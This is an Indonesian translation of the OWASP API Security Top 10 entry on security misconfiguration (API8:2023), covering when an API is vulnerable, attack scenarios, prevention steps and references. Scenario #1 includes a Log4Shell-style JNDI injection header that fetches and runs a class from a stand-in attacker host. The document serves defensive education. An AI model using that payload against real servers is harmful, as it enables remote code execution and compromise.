# API8:2023 Miskonfigurasi Keamanan

| Agen Ancaman/Vektor Serangan | Kelemahan Keamanan | Dampak |
| - | - | - |
| Khusus API : Kemungkinan Dieksploitasi **Mudah** | Prevalensi **Luas** : Kemungkinan Dideteksi **Mudah** | Teknis **Parah** : Khusus Bisnis |
| Penyerang sering mencoba menemukan kelemahan yang belum diperbaiki, endpoint umum, layanan yang berjalan dengan konfigurasi default yang tidak aman, atau file dan direktori yang tidak terlindungi untuk mendapatkan akses tidak sah atau pengetahuan tentang sistem. Sebagian besar informasi ini adalah pengetahuan publik dan eksploitasi mungkin tersedia. | Kesalahan konfigurasi keamanan dapat terjadi di semua tingkat stack API, mulai dari tingkat jaringan hingga tingkat aplikasi. Alat otomatis tersedia untuk mendeteksi dan mengeksploitasi kesalahan konfigurasi seperti layanan yang tidak perlu atau opsi warisan. | Kesalahan konfigurasi keamanan tidak hanya mengekspos data pengguna yang sensitif, tetapi juga detail sistem yang dapat menyebabkan kompromi penuh server. |

## Apakah API Rentan?

API menjadi rentan bila:

* Tidak ada penguncian keamanan yang sesuai di seluruh bagian stack API,
  atau izin yang dikonfigurasi dengan tidak benar pada layanan cloud
* Tidak ada patch keamanan terbaru, atau sistem sudah kadaluwarsa
* Fitur yang tidak diperlukan diaktifkan (misalnya, verba HTTP, fitur logging)
* Ada ketidaksesuaian dalam cara permintaan masuk diproses oleh server
  dalam rantai server HTTP
* Tidak ada Keamanan Lapisan Transportasi (TLS)
* Direktif keamanan atau kendali cache tidak dikirimkan kepada klien
* Kebijakan Cross-Origin Resource Sharing (CORS) hilang atau tidak diatur dengan tepat
* Pesan kesalahan mencakup stack trace, atau mengekspos informasi sensitif lainnya

## Contoh Skenario Serangan

### Skenario #1

Sebuah server API back-end menjaga catatan akses yang ditulis oleh utilitas logging sumber terbuka pihak ketiga yang populer dengan dukungan ekspansi tempat dan pencarian JNDI
(Java Naming and Directory Interface), keduanya diaktifkan secara default. Untuk
setiap permintaan, entri baru ditulis ke file log dengan pola berikut: `<metode> <versi_api>/<jalur> - <kode_status>`.

Pelaku jahat mengeluarkan permintaan API berikut, yang ditulis ke file log akses:

```
GET /health
X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
```

Karena konfigurasi default yang tidak aman dari utilitas logging dan kebijakan keluar jaringan yang longgar, dalam rangka menulis entri yang sesuai
ke file log akses, sambil memperluas nilai dalam header permintaan `X-Api-Version`, utilitas logging akan mengambil dan menjalankan objek `Malicious.class` dari server yang dikendalikan oleh pelaku jahat.

### Skenario #2

Sebuah situs jaringan sosial menawarkan fitur "Pesan Langsung" yang memungkinkan pengguna
mempertahankan percakapan pribadi. Untuk mengambil pesan baru untuk percakapan tertentu, situs web mengeluarkan permintaan API berikut (interaksi pengguna tidak diperlukan):

```
GET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA
```

Karena tanggapan API tidak menyertakaj header tanggapan HTTP `Cache-Control`, percakapan pribadi akan disimpan dalam cache browser web, memungkinkan
pelaku jahat mengambilnya dari file cache browser dalam sistem file.

## Cara Mencegah

Siklus hidup API harus mencakup:

* Proses pengerasan berulang yang menghasilkan penerapan lingkungan yang terkunci dengan benar dengan cepat dan mudah
* Tugas untuk meninjau dan memperbarui konfigurasi di seluruh stack API. Tinjauan harus mencakup: file orkestrasi, komponen API, dan layanan cloud
  (misalnya, izin bucket S3)
* Proses otomatis untuk terus-menerus menilai efektivitas konfigurasi dan pengaturan di semua lingkungan

Selain itu:

* Pastikan semua komunikasi API dari klien ke server API dan komponen hulu/hilir terjadi melalui saluran komunikasi yang terenkripsi
  (TLS), tanpa memandang apakah itu API internal atau publik.
* Lebih spesifik tentang verba HTTP mana pun yang dapat diakses oleh setiap API: semua verba HTTP lainnya harus dinonaktifkan (misalnya, HEAD).
* API yang diharapkan diakses dari klien berbasis browser (misalnya, front-end WebApp) harus setidaknya:
    * mengimplementasikan kebijakan Cross-Origin Resource Sharing (CORS) yang tepat
    * menyertakan Header Keamanan yang berlaku
* Batasi jenis konten/format data masuk hanya pada yang memenuhi persyaratan bisnis/fungsional.
* Pastikan semua server dalam rantai server HTTP (misalnya, load balancer, reverse and forward proxy, serta server backend) memproses permintaan masuk dengan cara yang seragam untuk menghindari masalah desinkronisasi.
* Jika memungkinkan, tentukan dan tegakkan semua skema muatan respons API, termasuk respons kesalahan, untuk mencegah pengecualian jejak dan informasi berharga lainnya dikirimkan kembali kepada pelaku serangan.

## Referensi

### OWASP

* [Proyek OWASP Secure Headers][1]
* [Pengujian Konfigurasi dan Manajemen Implementasi - Panduan Pengujian Keamanan Web Guide][2]
* [Pengujian Penanganan Kesalahan - Panduan Pengujian Keamanan Web][3]
* [Pengujian Cross Site Request Forgery - Panduan Pengujian Keamanan Web][4]

### Eksternal

* [CWE-2: Kelemahan Keamanan Lingkungan][5]
* [CWE-16: Konfigurasi][6]
* [CWE-209: Pembuatan Pesan Kesalahan yang Mengandung Informasi Sensitif][7]
* [CWE-319: Pengiriman Teks Terbuka Informasi Sensitif][8]
* [CWE-388: Penanganan Kesalahan][9]
* [CWE-444: Interpretasi Tidak Konsisten Permintaan HTTP ('HTTP Request/Response Smuggling')][10]
* [CWE-942: Kebijakan Lintas Domain yang Permissif dengan Domain yang Tidak Terpercaya][11]
* [Panduan Keamanan Umum Server][12], NIST
* [Let's Encrypt: Otoritas Sertifikat Gratis, Otomatis, dan Terbuka][13]

[1]: https://owasp.org/www-project-secure-headers/
[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README
[3]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README
[4]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery
[5]: https://cwe.mitre.org/data/definitions/2.html
[6]: https://cwe.mitre.org/data/definitions/16.html
[7]: https://cwe.mitre.org/data/definitions/209.html
[8]: https://cwe.mitre.org/data/definitions/319.html
[9]: https://cwe.mitre.org/data/definitions/388.html
[10]: https://cwe.mitre.org/data/definitions/444.html
[11]: https://cwe.mitre.org/data/definitions/942.html
[12]: https://csrc.nist.gov/publications/detail/sp/800-123/final
[13]: https://letsencrypt.org/
